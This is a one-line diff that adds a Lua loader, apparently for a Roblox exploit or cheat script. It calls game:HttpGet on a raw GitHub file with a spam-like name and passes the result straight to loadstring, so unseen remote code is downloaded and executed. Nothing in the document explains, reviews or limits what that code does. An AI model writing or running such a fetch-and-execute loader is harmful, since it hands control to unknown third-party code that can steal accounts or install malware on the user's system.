@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/7-days-cat-sitting-spam6-8vt2urpkk5ls2f.lua"))()
